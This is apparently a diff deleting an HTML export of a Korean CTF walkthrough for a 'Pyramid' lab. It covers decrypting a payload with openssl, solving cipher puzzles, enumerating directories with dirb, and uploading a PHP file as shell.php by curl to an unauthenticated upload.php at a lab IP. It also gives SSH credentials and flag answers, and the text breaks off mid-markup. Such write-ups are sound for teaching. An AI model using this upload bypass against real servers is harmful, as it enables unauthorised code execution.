-              6.<span style="font: 7pt 'Times New Roman'"
-                >&nbsp;&nbsp;&nbsp;&nbsp; </span
-              ><span lang="KO">암호문 </span>base64 <span lang="KO">얻기 </span>
-            </p>
-            <p
-              class="MsoNormal"
-              style="
-                margin-top: 0in;
-                margin-right: 0in;
-                margin-bottom: 0in;
-                margin-left: 20pt;
-                line-height: normal;
-              "
-            >
-              <img
-                border="0"
-                width="483"
-                height="30"
-                src="images/image017.png"
-              />
-            </p>
-            <p
-              class="MsoNormal"
-              style="
-                margin-top: 0in;
-                margin-right: 0in;
-                margin-bottom: 0in;
-                margin-left: 20pt;
-                line-height: normal;
-              "
-            >
-              &nbsp;
-            </p>
-            <p
-              class="MsoNormal"
-              style="margin-bottom: 0in; line-height: normal"
-            >
-              =============================================================
-            </p>
-            <p
-              class="MsoListParagraph"
-              style="
-                margin-top: 0in;
-                margin-right: 0in;
-                margin-bottom: 0in;
-                margin-left: 38pt;
-                text-indent: -0.25in;
-                line-height: normal;
-              "
-            >
-              7.<span style="font: 7pt 'Times New Roman'"
-                >&nbsp;&nbsp;&nbsp;&nbsp; </span
-              ><span lang="KO">암호문을 복호화하는 과정을 진행 </span>(<span
-                lang="KO"
-                >전체과정에 </span
-              >payload<span lang="KO">를 활용해보는 것</span>)
-            </p>
-            <p
-              class="MsoListParagraph"
-              style="
-                margin-top: 0in;
-                margin-right: 0in;
-                margin-bottom: 0in;
-                margin-left: 38pt;
-                line-height: normal;
-              "
-            >
-              +<span lang="KO"
-                >어려워 보이지만 사이버셰프와 같은 도구 활용시 빨리 풀림 </span
-              >+
-            </p>
-            <p
-              class="MsoListParagraph"
-              style="
-                margin-top: 0in;
-                margin-right: 0in;
-                margin-bottom: 0in;
-                margin-left: 38pt;
-                line-height: normal;
-              "
-            >
-              7-1. b64<span lang="KO">를 디코드하는 과정</span> 
-            </p>
-            <p
-              class="MsoListParagraph"
-              style="
-                margin-top: 0in;
-                margin-right: 0in;
-                margin-bottom: 0in;
-                margin-left: 38pt;
-                line-height: normal;
-              "
-            >
-              <img
-                border="0"
-                width="513"
-                height="80"
-                src="images/image018.jpg"
-              />
-            </p>
-            <p
-              class="MsoListParagraph"
-              style="margin-bottom: 0in; line-height: normal"
-            >
-              echo -n &quot;$b64&quot; | base64 -d &gt; /tmp/payload.bin
-            </p>
-            <p
-              class="MsoListParagraph"
-              style="margin-bottom: 0in; line-height: normal"
-            >
-              # $b64(<span lang="KO">헤더 없는</span> base64
-              <span lang="KO">문자열</span>)<span lang="KO"
-                >를 디코드하여 바이너리로</span
-              >
-              /tmp/payload.bin<span lang="KO">에 저장</span>
-            </p>
-            <p
-              class="MsoListParagraph"
-              style="margin-bottom: 0in; line-height: normal"
-            >
-              ls -l /tmp/payload.bin
-            </p>
-            <p
-              class="MsoListParagraph"
-              style="
-                margin-top: 0in;
-                margin-right: 0in;
-                margin-bottom: 0in;
-                margin-left: 38pt;
-                line-height: normal;
-              "
-            >
-              # <span lang="KO">파일이 생성되었는지와 권한</span>/<span
-                lang="KO"
-                >크기 등 간단한 정보를 출력</span
-              >
-            </p>
-            <p
-              class="MsoListParagraph"
-              style="
-                margin-top: 0in;
-                margin-right: 0in;
-                margin-bottom: 0in;
-                margin-left: 38pt;
-                line-height: normal;
-              "
-            >
-              &nbsp;
-            </p>
-            <p
-              class="MsoListParagraph"
-              style="
-                margin-top: 0in;
-                margin-right: 0in;
-                margin-bottom: 0in;
-                margin-left: 38pt;
-                line-height: normal;
-              "
-            >
-              7-2. IV <span lang="KO">값 구하기 </span>(payload
-              <span lang="KO">요소</span>)
-            </p>
-            <p
-              class="MsoListParagraph"
-              style="
-                margin-top: 0in;
-                margin-right: 0in;
-                margin-bottom: 0in;
-                margin-left: 38pt;
-                line-height: normal;
-              "
-            >
-              <img
-                border="0"
-                width="511"
-                height="136"
-                src="images/image019.jpg"
-              />
-            </p>
-            <p
-              class="MsoListParagraph"
-              style="margin-bottom: 0in; line-height: normal"
-            >
-              xxd -g 1 -l 32 /tmp/payload.bin | sed -n '1,3p'
-            </p>
-            <p
-              class="MsoListParagraph"
-              style="margin-bottom: 0in; line-height: normal"
-            >
-              # payload <span lang="KO">시작부분</span>(<span lang="KO"
-                >최대</span
-              >
-              32<span lang="KO">바이트</span>)<span lang="KO">을 헥스</span
-              >+ASCII <span lang="KO">형식으로 출력하여</span> IV
-              <span lang="KO">위치 등 확인</span>
-            </p>
-            <p
-              class="MsoListParagraph"
-              style="margin-bottom: 0in; line-height: normal"
-            >
-              ivhex=$(xxd -p -l 16 /tmp/payload.bin | tr -d '\n')
-            </p>
-            <p
-              class="MsoListParagraph"
-              style="
-                margin-top: 0in;
-                margin-right: 0in;
-                margin-bottom: 0in;
-                margin-left: 38pt;
-                line-height: normal;
-              "
-            >
-              # payload<span lang="KO">의 첫</span> 16<span lang="KO"
-                >바이트를 연속된</span
-              >
-              hex<span lang="KO">문자열로 추출하고 개행 제거하여</span>
-              ivhex<span lang="KO">에 저장</span>
-            </p>
-            <p
-              class="MsoListParagraph"
-              style="
-                margin-top: 0in;
-                margin-right: 0in;
-                margin-bottom: 0in;
-                margin-left: 38pt;
-                line-height: normal;
-              "
-            >
-              <img
-                border="0"
-                width="343"
-                height="81"
-                src="images/image020.png"
-              />
-            </p>
-            <p
-              class="MsoListParagraph"
-              style="
-                margin-top: 0in;
-                margin-right: 0in;
-                margin-bottom: 0in;
-                margin-left: 38pt;
-                line-height: normal;
-              "
-            >
-              &nbsp;
-            </p>
-            <p
-              class="MsoListParagraph"
-              style="
-                margin-top: 0in;
-                margin-right: 0in;
-                margin-bottom: 0in;
-                margin-left: 38pt;
-                line-height: normal;
-              "
-            >
-              7-3. <span lang="KO">암호문 추출 및 크기 검증 </span>
-            </p>
-            <p
-              class="MsoListParagraph"
-              style="
-                margin-top: 0in;
-                margin-right: 0in;
-                margin-bottom: 0in;
-                margin-left: 38pt;
-                line-height: normal;
-              "
-            >
-              <img
-                border="0"
-                width="456"
-                height="108"
-                src="images/image021.jpg"
-              />
-            </p>
-            <p
-              class="MsoListParagraph"
-              style="margin-bottom: 0in; line-height: normal"
-            >
-              dd if=/tmp/payload.bin of=/tmp/cipher.bin bs=1 skip=16 status=none
-            </p>
-            <p
-              class="MsoListParagraph"
-              style="margin-bottom: 0in; line-height: normal"
-            >
-              # <span lang="KO">파일의 앞</span> 16<span lang="KO"
-                >바이트를 건너뛰고 나머지를 </span
-              >/tmp/cipher.bin<span lang="KO">으로 복사</span> (<span lang="KO"
-                >바이트 단위</span
-              >)
-            </p>
-            <p
-              class="MsoListParagraph"
-              style="margin-bottom: 0in; line-height: normal"
-            >
-              &nbsp;
-            </p>
-            <p
-              class="MsoListParagraph"
-              style="margin-bottom: 0in; line-height: normal"
-            >
-              stat -c &quot;cipher.bin size: %s bytes&quot; /tmp/cipher.bin
-            </p>
-            <p
-              class="MsoListParagraph"
-              style="
-                margin-top: 0in;
-                margin-right: 0in;
-                margin-bottom: 0in;
-                margin-left: 38pt;
-                line-height: normal;
-              "
-            >
-              # <span lang="KO">생성된</span> cipher.bin<span lang="KO"
-                >의 크기를 출력하여 기대 크기인지 확인</span
-              >
-            </p>
-            <p
-              class="MsoListParagraph"
-              style="
-                margin-top: 0in;
-                margin-right: 0in;
-                margin-bottom: 0in;
-                margin-left: 38pt;
-                line-height: normal;
-              "
-            >
-              &nbsp;
-            </p>
-            <p
-              class="MsoListParagraph"
-              style="
-                margin-top: 0in;
-                margin-right: 0in;
-                margin-bottom: 0in;
-                margin-left: 38pt;
-                line-height: normal;
-              "
-            >
-              7-4. <span lang="KO">복호화</span>
-            </p>
-            <p
-              class="MsoListParagraph"
-              style="
-                margin-top: 0in;
-                margin-right: 0in;
-                margin-bottom: 0in;
-                margin-left: 38pt;
-                line-height: normal;
-              "
-            >
-              <img
-                border="0"
-                width="602"
-                height="41"
-                src="images/image022.jpg"
-              />
-            </p>
-            <p
-              class="MsoListParagraph"
-              style="
-                margin-top: 0in;
-                margin-right: 0in;
-                margin-bottom: 0in;
-                margin-left: 38pt;
-                line-height: normal;
-              "
-            >
-              openssl enc -d -aes-128-cbc -in /tmp/cipher.bin -K
-              &quot;$keyhex&quot; -iv &quot;$ivhex&quot; -out
-            </p>
-            <p
-              class="MsoListParagraph"
-              style="
-                margin-top: 0in;
-                margin-right: 0in;
-                margin-bottom: 0in;
-                margin-left: 38pt;
-                line-height: normal;
-              "
-            >
-               /tmp/plain.txt 2&gt;/tmp/openssl.err || true
-            </p>
-            <p
-              class="MsoListParagraph"
-              style="
-                margin-top: 0in;
-                margin-right: 0in;
-                margin-bottom: 0in;
-                margin-left: 38pt;
-                line-height: normal;
-              "
-            >
-              # openssl<span lang="KO">을 통해서 </span>AES-128-CBC
-              <span lang="KO">복호화 시도 </span>
-            </p>
-            <p
-              class="MsoListParagraph"
-              style="
-                margin-top: 0in;
-                margin-right: 0in;
-                margin-bottom: 0in;
-                margin-left: 38pt;
-                line-height: normal;
-              "
-            >
-              # true
-              <span lang="KO"
-                >스크립트에 실패해도 중단 되는 것을 막는 용도
-              </span>
-            </p>
-            <p
-              class="MsoListParagraph"
-              style="
-                margin-top: 0in;
-                margin-right: 0in;
-                margin-bottom: 0in;
-                margin-left: 38pt;
-                line-height: normal;
-              "
-            >
-              7-5. <span lang="KO">평문</span>(pw)<span lang="KO"
-                >을 출력
-              </span>
-            </p>
-            <p
-              class="MsoListParagraph"
-              style="margin-bottom: 0in; line-height: normal"
-            >
-              <img
-                border="0"
-                width="248"
-                height="84"
-                src="images/image023.png"
-              />
-            </p>
-            <p
-              class="MsoListParagraph"
-              style="margin-bottom: 0in; line-height: normal"
-            >
-              echo &quot;Decrypted (text):&quot;
-            </p>
-            <p
-              class="MsoListParagraph"
-              style="margin-bottom: 0in; line-height: normal"
-            >
-              #
-              <span lang="KO"
-                >복호화된 파일을 텍스트 형태로 먼저 출력하겠다고 표시</span
-              >
-            </p>
-            <p
-              class="MsoListParagraph"
-              style="margin-bottom: 0in; line-height: normal"
-            >
-              <img
-                border="0"
-                width="255"
-                height="56"
-                id="그림 20"
-                src="images/image024.png"
-              />
-            </p>
-            <p
-              class="MsoListParagraph"
-              style="margin-bottom: 0in; line-height: normal"
-            >
-              cat /tmp/plain.txt || true
-            </p>
-            <p
-              class="MsoListParagraph"
-              style="
-                margin-top: 0in;
-                margin-right: 0in;
-                margin-bottom: 0in;
-                margin-left: 38pt;
-                text-indent: -0.25in;
-                line-height: normal;
-              "
-            >
-              <span style="font-family: Wingdings"
-                >è<span style="font: 7pt 'Times New Roman'">&nbsp; </span></span
-              >luckforyournext_!21! <span lang="KO">라는 결과물을 얻었음 </span>
-            </p>
-            <p
-              class="MsoNormal"
-              style="margin-bottom: 0in; line-height: normal"
-            >
-               =============================================================
-            </p>
-            <p
-              class="MsoListParagraph"
-              style="
-                margin-top: 0in;
-                margin-right: 0in;
-                margin-bottom: 0in;
-                margin-left: 38pt;
-                text-indent: -0.25in;
-                line-height: normal;
-              "
-            >
-              8.<span style="font: 7pt 'Times New Roman'"
-                >&nbsp;&nbsp;&nbsp;&nbsp; </span
-              ><span lang="KO">다음 페이지에 대한 힌트 제공 </span>
-            </p>
-            <p
-              class="MsoListParagraph"
-              style="
-                margin-top: 0in;
-                margin-right: 0in;
-                margin-bottom: 0in;
-                margin-left: 56pt;
-                text-indent: -0.25in;
-                line-height: normal;
-              "
-            >
-              -<span style="font: 7pt 'Times New Roman'"
-                >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span
-              ><span lang="KO"
-                >우측하단을 잘 눌러보면 커서의 형태가 바뀌는 부분이 있음</span
-              >
-            </p>
-            <p
-              class="MsoListParagraph"
-              style="
-                margin-top: 0in;
-                margin-right: 0in;
-                margin-bottom: 0in;
-                margin-left: 56pt;
-                text-indent: -0.25in;
-                line-height: normal;
-              "
-            >
-              -<span style="font: 7pt 'Times New Roman'"
-                >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span
-              > <span lang="KO">그 부분을 클릭하면 힌트가 나옴 </span>
-            </p>
-            <p
-              class="MsoListParagraph"
-              style="
-                margin-top: 0in;
-                margin-right: 0in;
-                margin-bottom: 0in;
-                margin-left: 38pt;
-                line-height: normal;
-              "
-            >
-              <img
-                border="0"
-                width="378"
-                height="155"
-                src="images/image025.jpg"
-              />
-            </p>
-            <p
-              class="MsoListParagraph"
-              style="
-                margin-top: 0in;
-                margin-right: 0in;
-                margin-bottom: 0in;
-                margin-left: 38pt;
-                line-height: normal;
-              "
-            >
-              &nbsp;
-            </p>
-          </td>
-        </tr>
-      </table>
-    </div>
-
-    <span
-      style="
-        font-size: 10pt;
-        line-height: 107%;
-        font-family: 'Malgun Gothic', sans-serif;
-      "
-      ><br clear="all" style="page-break-before: always" />
-    </span>
-
-    <div class="WordSection3">
-      <p class="MsoNormal" style="margin-left: 10pt; text-indent: -10pt">
-        1. <span lang="KO">앞사람의 모달에서 다음페이지는 </span>game.php<span
-          lang="KO"
-          >라고 힌트를주었고 앞사람 </span
-        >flag<span lang="KO">를 풀면 비밀번호 </span>
-      </p>
-
-      <p class="MsoNormal" style="margin-left: 10pt; text-indent: -10pt">
-        luckforyournext_!21! <span lang="KO">가 나오는데 이거를 </span>game.php
-        <span lang="KO">페이지 들어갈 때 입력하면된다</span>.
-      </p>
-
-      <p class="MsoNormal" style="margin-left: 10pt; text-indent: -10pt">
-         <img
-          border="0"
-          width="492"
-          height="327"
-          id="그림 2"
-          src="images/image026.jpg"
-        />
-      </p>
-
-      <p class="MsoNormal">&nbsp;</p>
-
-      <p class="MsoNormal">
-        <img
-          border="0"
-          width="528"
-          height="351"
-          id="그림 4"
-          src="images/image027.jpg"
-        />
-      </p>
-
-      <p class="MsoNormal">
-        <span lang="KO">그럼 위와같이</span> game.php
-        <span lang="KO">페이지가 뜬다</span>.
-      </p>
-
-      <p class="MsoNormal" style="margin-left: 10pt; text-indent: -10pt">
-        2. <span lang="KO">첫번째 사진으로 들어가면 </span>mirro.php<span
-          lang="KO"
-          >페이지가 뜬다</span
-        >. <span lang="KO">이 페이지의 미로를 탈출하면 </span>flag<span
-          lang="KO"
-          >로</span
-        >`uvrebtylcuvp` <span lang="KO">가나오는데 이거를 </span>ROT13<span
-          lang="KO"
-          >으로 디코딩하면 </span
-        >`hieroglyphic(<span lang="KO">이집트상형문자</span>-<span lang="KO"
-          >다음페이지암호힌트</span
-        >)`<span lang="KO">가 나온다</span>.
-        <span lang="KO">이거는 다음페이지의 비번이다</span>. (<span lang="KO"
-          >다음페이지는 </span
-        >chamber.php)
-      </p>
-
-      <p class="MsoNormal" style="margin-left: 10pt; text-indent: -10pt">
-        <img
-          border="0"
-          width="248"
-          height="371"
-          src="images/image028.jpg"
-        /><img
-          border="0"
-          width="247"
-          height="370"
-          src="images/image029.jpg"
-        />
-      </p>
-
-      <p class="MsoNormal">
-        3. game.php<span lang="KO">에서 두번째 사진을 클릭하면 </span
-        >image.php<span lang="KO">페이지가 나온다</span>.
-      </p>
-
-      <p class="MsoNormal">
-        <span lang="KO"
-          >이때 그림의 여기저기를 눌러보면 모달창이 하나 나오는데 다음페이지는 </span
-        >`chamber`<span lang="KO">라고 힌트가 나온다</span>.
-      </p>
-
-      <p class="MsoNormal">
-        <span lang="KO">그러면 이때까지 </span>.php<span lang="KO"
-          >로 페이지 열던 것을 보아 </span
-        >chamber.php<span lang="KO"
-          >로 유추하여 페이지로 이동할것이다 그러면 방금 얻은 비번</span
-        >(`hieroglyphic ‘)<span lang="KO">을 넣어 접속하면된다</span>.
-      </p>
-
-      <p class="MsoNormal">
-        <img
-          border="0"
-          width="314"
-          height="218"
-          id="그림 16"
-          src="images/image030.jpg"
-        />
-      </p>
-
-      <p class="MsoNormal">
-        <img
-          border="0"
-          width="178"
-          height="123"
-          src="images/image031.png"
-        /> <span lang="KO">이부분클릭시</span>
-      </p>
-
-      <p class="MsoNormal">
-        <img
-          border="0"
-          width="250"
-          height="163"
-          id="그림 14"
-          src="images/image032.jpg"
-        /> <span lang="KO">이렇게 다음페이지 힌트가뜬다</span>.
-      </p>
-
-      <p class="MsoNormal">
-        4. chamber.php
-        <span lang="KO"
-          >페이지에 접속하면 어떤 암호문이 보이는데 이것은 이집트 암호이다</span
-        >.
-        <span lang="KO"
-          >인터넷에 서치해보면 암호문표가 나올것이고 그것을 해석하면 </span
-        >`artifact`<span lang="KO">라는 </span>flag<span lang="KO"
-          >를 얻게된다</span
-        >.
-      </p>
-
-      <p class="MsoNormal">
-        <span lang="KO"
-          >그리고 화면 오른쪽 아래 특정부분을 클릭하게되면 다음방은 </span
-        >Tomb <span lang="KO">라고 힌트가 나온다</span>.
-        <span lang="KO">이게 다음페이지 </span>Tomb.php<span lang="KO"
-          >의 힌트이다</span
-        >.
-      </p>
-
-      <p class="MsoNormal">
-        <img
-          border="0"
-          width="424"
-          height="264"
-          id="그림 18"
-          src="images/image033.jpg"
-        />
-      </p>
-
-      <p class="MsoNormal">
-        <img
-          border="0"
-          width="85"
-          height="153"
-          src="images/image034.png"
-        /> <span lang="KO">여기를 클릭하면 </span>
-      </p>
-
-      <p class="MsoNormal">
-        <img
-          border="0"
-          width="273"
-          height="173"
-          src="images/image035.jpg"
-        /> <span lang="KO">이렇게 모달창이뜬다</span>.
-      </p>
-
-      <p class="MsoNormal">
-        <span lang="KO">다음페이지이름 </span>Tomb<span lang="KO"
-          >를 알수있다</span
-        >.
-      </p>
-
-      <p class="MsoNormal">
-        5. Tomb.php<span lang="KO">에 접속하여 아까 얻은 </span>artifact
-        <span lang="KO">암호를 넣으면 파일업로드하는 페이지가보인다</span>.
-      </p>
-
-      <p class="MsoNormal">
-        <span lang="KO"
-          >파일업로드는 권한이 없기 때문에 업로드하지 못하는 페이지이다</span
-        >. <span lang="KO">하지만 </span>upload.phpp
-        <span lang="KO">파일을 서버측에서 세션</span>/<span lang="KO"
-          >권한 체크하지 않기 때문에 누구나 직접 </span
-        >POST/upload.php
-        <span lang="KO"
-          >로 파일을 올릴수있다는 취약점이 있는 것을 이용하는것이다</span
-        >.
-      </p>
-
-      <p class="MsoNormal">
-        <img
-          border="0"
-          width="359"
-          height="199"
-          src="images/image036.jpg"
-        />
-      </p>
-
-      <p class="MsoNormal"> </p>
-
-      <p class="MsoNormal">
-        6. <span lang="KO">사용자가 아무 </span>test.php
-        <span lang="KO">파일을 만들어서 </span>curl<span lang="KO"
-          >을 통해 파일을 올리면 </span
-        >/uploads
-        <span lang="KO"
-          >페이지로 들어가보면 파일이 업로드 된 것을 확인가능하다</span
-        >.
-      </p>
-
-      <p class="MsoNormal">
-        <span lang="KO">이때 </span>/uploads<span lang="KO">파일은 </span>dirb
-        <a href="http://192.168.16.54">http://192.168.16.54</a>
-        <span lang="KO">하면 </span>/uploads
-        <span lang="KO">파일이나온다</span>.
-      </p>
-
-      <p class="MsoNormal">
-        <img
-          border="0"
-          width="461"
-          height="71"
-          src="images/image037.png"
-        />
-      </p>
-
-      <p class="MsoNormal">1) vi test.php</p>
-
-      <p class="MsoNormal">
-        <img
-          border="0"
-          width="314"
-          height="191"
-          id="그림 11"
-          src="images/image038.jpg"
-        />
-      </p>
-
-      <p class="MsoNormal">
-        <span
-          style="
-            font-size: 11.5pt;
-            line-height: 107%;
-            font-family: 'Fira Mono';
-            color: #212529;
-            letter-spacing: -0.05pt;
-            background: #e9ecef;
-          "
-          >2) curl -v -F &quot;file=@./test.php;filename=shell.php&quot; </span
-        ><a href="http://192.168.16.15/upload.php"
-          ><span
-            style="
-              font-size: 11.5pt;
-              line-height: 107%;
-              font-family: 'Fira Mono';
-              letter-spacing: -0.05pt;
-              background: #e9ecef;
-            "
-            >http://192.168.16.15/upload.php</span
-          ></a
-        >
-      </p>
-
-      <p class="MsoNormal">
-        <span
-          style="
-            font-size: 11.5pt;
-            line-height: 107%;
-            font-family: 'Fira Mono';
-            color: #212529;
-            letter-spacing: -0.05pt;
-            background: #e9ecef;
-          "
-          >3) /uploads </span
-        ><span
-          lang="KO"
-          style="
-            font-size: 11.5pt;
-            line-height: 107%;
-            color: #212529;
-            letter-spacing: -0.05pt;
-            background: #e9ecef;
-          "
-          >페이지</span
-        ><span
-          lang="KO"
-          style="
-            font-size: 11.5pt;
-            line-height: 107%;
-            font-family: 'Fira Mono';
-            color: #212529;
-            letter-spacing: -0.05pt;
-            background: #e9ecef;
-          "
-        >
-        </span
-        ><span
-          lang="KO"
-          style="
-            font-size: 11.5pt;
-            line-height: 107%;
-            color: #212529;
-            letter-spacing: -0.05pt;
-            background: #e9ecef;
-          "
-          >접속</span
-        >
-      </p>
-
-      <p class="MsoNormal">
-        <img
-          border="0"
-          width="352"
-          height="193"
-          src="images/image039.jpg"
-        />
-      </p>
-
-      <p
-        class="MsoListParagraph"
-        style="margin-left: 38pt; text-indent: -0.25in"
-      >
-        <span
-          style="
-            font-size: 11.5pt;
-            line-height: 107%;
-            font-family: Wingdings;
-            color: #212529;
-          "
-          >è<span style="font: 7pt 'Times New Roman'"> </span></span
-        ><span lang="KO">파일업로드된공간에 </span>shell.php
-        <span lang="KO">파일이 업로드된 것을 확인가능</span>
-      </p>
-
-      <p class="MsoNormal">
-        4) shell.php <span lang="KO">들어가보면 </span>flag
-        <span lang="KO">출력된것을 확인가능 이 </span>flag<span lang="KO"
-          >는 다음단계에서 사용자 비밀번호로 사용된다</span
-        >.
-      </p>
-
-      <p class="MsoNormal">
-        <img
-          border="0"
-          width="316"
-          height="127"
-          src="images/image040.png"
-        />
-      </p>
-
-      <p class="MsoNormal">&nbsp;</p>
-
-      <p class="MsoNormal">
-        + <span lang="KO">디렉토리는 사진에 숨겨놓은거외에도 </span>dirb<span
-          lang="KO"
-          >를 쓰면 디렉토리명은 나온다</span
-        >.
-      </p>
-    </div>
-
-    <span
-      style="
-        font-size: 10pt;
-        line-height: 107%;
-        font-family: 'Malgun Gothic', sans-serif;
-      "
-      ><br clear="all" style="page-break-before: always" />
-    </span>
-
-    <div class="WordSection4">
-      <p class="MsoNormal" align="center" style="text-align: center">
-        <b
-          ><span
-            style="
-              font-size: 14pt;
-              line-height: 107%;
-              font-family: 'Noto Sans KR';
-            "
-            >Pyramid 4<span lang="KO">단계 </span>Walk-Through</span
-          ></b
-        >
-      </p>
-
-      <p class="MsoNormal" style="margin-left: 38pt">
-        <span style="line-height: 107%; font-family: 'Noto Sans KR'"
-          >&nbsp;</span
-        >
-      </p>
-
-      <p
-        class="MsoListParagraph"
-        style="margin-left: 56pt; text-indent: -0.25in"
-      >
-        <span style="line-height: 107%; font-family: 'Noto Sans KR'"
-          >1.<span style="font: 7pt 'Times New Roman'"
-            >&nbsp;&nbsp;&nbsp;&nbsp;
-          </span></span
-        ><span style="line-height: 107%; font-family: 'Noto Sans KR'"
-          >3<span lang="KO"
-            >단계에서 마지막 과정을 통해 비밀번호를 얻었다면 </span
-          >SSH <span lang="KO">접속을 시도합니다</span>.</span
-        >
-      </p>
-
-      <p class="MsoListParagraph" style="margin-left: 56pt">
-        <span style="line-height: 107%; font-family: 'Noto Sans KR'"
-          ><img
-            border="0"
-            width="448"
-            height="136"
-            id="그림 1"
-            src="images/image041.png"
-        /></span>
-      </p>
-
-      <p
-        class="MsoListParagraph"
-        style="margin-left: 74pt; text-indent: -0.25in"
-      >
-        <span style="line-height: 107%; font-family: Wingdings"
-          >ð<span style="font: 7pt 'Times New Roman'">&nbsp; </span></span
-        ><span style="line-height: 107%; font-family: 'Noto Sans KR'"
-          >SSH <span lang="KO">접속에 사용된 계정 정보</span></span
-        >
-      </p>
-
-      <p class="MsoListParagraph" style="margin-left: 96pt; text-indent: -20pt">
-        <span style="line-height: 107%; font-family: Wingdings"
-          >n<span style="font: 7pt 'Times New Roman'">&nbsp; </span></span
-        ><span style="line-height: 107%; font-family: 'Noto Sans KR'"
-          >Username: khufu</span
-        >
-      </p>
-
-      <p class="MsoListParagraph" style="margin-left: 96pt; text-indent: -20pt">
-        <span style="line-height: 107%; font-family: Wingdings"
-          >n<span style="font: 7pt 'Times New Roman'">&nbsp; </span></span
-        ><span style="line-height: 107%; font-family: 'Noto Sans KR'"
-          >Password: 747574616e6b68616d756e</span
-        >
-      </p>
-
-      <p class="MsoNormal" style="margin-left: 76pt">
-        <span style="line-height: 107%; font-family: 'Noto Sans KR'"
-          >&nbsp;</span
-        >
-      </p>
-
-      <p
-        class="MsoListParagraph"
-        style="margin-left: 56pt; text-indent: -0.25in"
-      >
-        <span style="line-height: 107%; font-family: 'Noto Sans KR'"
-          >2.<span style="font: 7pt 'Times New Roman'"
-            >&nbsp;&nbsp;&nbsp;&nbsp;
-          </span></span
-        ><i
-          ><span style="line-height: 107%; font-family: 'Noto Sans KR'"
-            >“ls -la”</span
-          ></i
-        ><span lang="KO" style="line-height: 107%; font-family: 'Noto Sans KR'"
-          >를 통하여 디렉터리 구조를 살핍니다</span
-        ><span style="line-height: 107%; font-family: 'Noto Sans KR'">.</span>
-      </p>
-
-      <p class="MsoNormal" style="margin-left: 56pt">
-        <span style="line-height: 107%; font-family: 'Noto Sans KR'"
-          ><img
-            border="0"
-            width="492"
-            height="207"
-            id="그림 13"
-            src="images/image042.png"
-        /></span>
-      </p>
-
-      <p
-        class="MsoListParagraph"
-        style="margin-left: 74pt; text-indent: -0.25in"
-      >
-        <span style="line-height: 107%; font-family: Wingdings"
-          >ð<span style="font: 7pt 'Times New Roman'">&nbsp; </span></span
-        ><span style="line-height: 107%; font-family: 'Noto Sans KR'"
-          >‘papyrus’, ‘/room’, ‘rosetta_stone’
-          <span lang="KO">이라는 파일과 디렉터리가 각각 보입니다</span>.</span
-        >
-      </p>
-
-      <span
-        style="font-size: 10pt; line-height: 107%; font-family: 'Noto Sans KR'"
-        ><br clear="all" style="page-break-before: always" />
-      </span>
-
-      <p
-        class="MsoNormal"
-        style="
-          text-autospace: ideograph-numeric ideograph-other;
-          word-break: normal;
-        "
-      >
-        <span style="line-height: 107%; font-family: 'Noto Sans KR'"
-          >&nbsp;</span
-        >
-      </p>
-
-      <p class="MsoNormal">
-        <span style="line-height: 107%; font-family: 'Noto Sans KR'"
-          >&nbsp;</span
-        >
-      </p>
-
-      <p
-        class="MsoListParagraph"
-        style="margin-left: 56pt; text-indent: -0.25in"
-      >
-        <span style="line-height: 107%; font-family: 'Noto Sans KR'"
-          >3.<span style="font: 7pt 'Times New Roman'"
-            >&nbsp;&nbsp;&nbsp;&nbsp;
-          </span></span
-        ><span style="line-height: 107%; font-family: 'Noto Sans KR'"
-          >Cat <span lang="KO">명령어를 통하여 </span>papyrus<span lang="KO"
-            >의 내용을 살펴봅니다</span
-          >.</span
-        >
-      </p>
-
-      <p class="MsoNormal" style="margin-left: 56pt">
-        <span style="line-height: 107%; font-family: 'Noto Sans KR'"
-          ><img
-            border="0"
-            width="312"
-            height="76"
-            id="그림 15"
-            src="images/image043.png"
-        /></span>
-      </p>
-
-      <p
-        class="MsoListParagraph"
-        style="margin-left: 74pt; text-indent: -0.25in"
-      >
-        <span style="line-height: 107%; font-family: Wingdings"
-          >ð<span style="font: 7pt 'Times New Roman'">&nbsp; </span></span
-        ><span style="line-height: 107%; font-family: 'Noto Sans KR'"
-          >“<span lang="KO">우리는 마침내 피라미드를 찾았다</span>”, “<span
-            lang="KO"
-            >우리는 여기에 마법이 필요하다</span
-          >”<span lang="KO">랍니다</span>.</span
-        >
-      </p>
-
-      <p class="MsoListParagraph" style="margin-left: 74pt">
-        <span style="line-height: 107%; font-family: 'Noto Sans KR'"
-          >&nbsp;</span
-        >
-      </p>
-
-      <p
-        class="MsoListParagraph"
-        style="margin-left: 56pt; text-indent: -0.25in"
-      >
-        <span style="line-height: 107%; font-family: 'Noto Sans KR'"
-          >4.<span style="font: 7pt 'Times New Roman'"
-            >&nbsp;&nbsp;&nbsp;&nbsp;
-          </span></span
-        ><span style="line-height: 107%; font-family: 'Noto Sans KR'"
-          >/home/khufu/room directory<span lang="KO">의 구조를 살핍니다</span
-          >.</span
-        >
-      </p>
-
-      <p class="MsoListParagraph" style="margin-left: 56pt">
-        <span style="line-height: 107%; font-family: 'Noto Sans KR'"
-          ><img
-            border="0"
-            width="429"
-            height="217"
-            id="그림 17"
-            src="images/image044.png"
-        /></span>
-      </p>
-
-      <p
-        class="MsoListParagraph"
-        style="margin-left: 74pt; text-indent: -0.25in"
-      >
-        <span style="line-height: 107%; font-family: Wingdings"
-          >ð<span style="font: 7pt 'Times New Roman'">&nbsp; </span></span
-        ><span lang="KO" style="line-height: 107%; font-family: 'Noto Sans KR'"
-          >여러 파일과 하위 디렉터리가 확인됩니다</span
-        ><span style="line-height: 107%; font-family: 'Noto Sans KR'"
-          >, <span lang="KO">하나씩 구조를 살펴봅시다</span>.<br
-            clear="all"
-            style="page-break-before: always"
-          />
-        </span>
-      </p>
-
-      <p
-        class="MsoListParagraph"
-        style="margin-left: 56pt; text-indent: -0.25in"
-      >
-        <span style="line-height: 107%; font-family: 'Noto Sans KR'"
-          >5.<span style="font: 7pt 'Times New Roman'"
-            >&nbsp;&nbsp;&nbsp;&nbsp;
-          </span></span
-        ><span style="line-height: 107%; font-family: 'Noto Sans KR'"
-          >Directory /1, /2, /3, 4</span
-        >
-      </p>
-
-      <p class="MsoNormal" style="margin-left: 56pt">
-        <span style="line-height: 107%; font-family: 'Noto Sans KR'"
-          ><img
-            border="0"
-            width="491"
-            height="185"
-            id="그림 5"
-            src="images/image045.png"
-        /></span>
-      </p>
-
-      <p class="MsoNormal" style="margin-left: 56pt">
-        <span style="line-height: 107%; font-family: 'Noto Sans KR'"
-          ><img
-            border="0"
-            width="321"
-            height="183"
-            id="그림 19"
-            src="images/image046.png"
-        /></span>
-      </p>
-
-      <p
